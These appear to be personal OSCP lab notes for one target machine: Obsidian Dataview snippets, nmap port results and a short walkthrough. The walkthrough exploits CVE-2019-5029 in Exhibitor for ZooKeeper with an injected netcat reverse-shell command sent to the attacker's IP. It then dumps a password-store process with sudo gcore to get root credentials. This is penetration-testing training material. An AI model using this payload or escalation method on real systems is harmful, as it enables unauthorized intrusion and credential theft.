IP::   192.168.217.98

| Machine | IP Address | Notes |
| ------- | ---------- | ----- |
|         |            |       |

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
KALI IP::  192.168.45.226
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `${KaliIP}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Web Address
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
Discovered Web Domain::   192.168.113.98
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `http://${discoveredDomain}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
[[Editing Page]]

wget from local python server
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:8000/[file]`;

dv.paragraph("```bash\n" + command + "\n```");
```
## Provided Credentials
---

```
ClogKingpinInning731
```

```

```

---
## Software Versions







---



## Open Ports
---
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
631/tcp  open  ipp         CUPS 2.2
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
8080/tcp open  http        Jetty 1.0
8081/tcp open  http        nginx 1.14.2
http://192.168.113.98:8080/exhibitor/v1/ui/index.html
39605/tcp open  java-rmi    Java RMI

| Port | Service | Notes |
| ---- | ------- | ----- |
|      |         |       |

---

## Discovered Subdomains
---


---

## Discovered Credentials
---

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---

## Attack Angles
---


---

## User Flag

```

```

## Root Flag

```

```

---

visited http://192.168.217.98:8080/exhibitor/v1/ui/index.html and discovered exhibiter for zookeeper v1.

CVE-2019-5029 https://www.exploit-db.com/exploits/48654

$(/bin/nc -e /bin/sh 192.168.45.226 4444 &)  in java.env script field.

received a reverse shell connection and local flag

---

sudo -l reveals /usr/bin/gcore

ps auxww shows pid513 password-store

password store shows creds ClogKingpinInning731

su root login = root



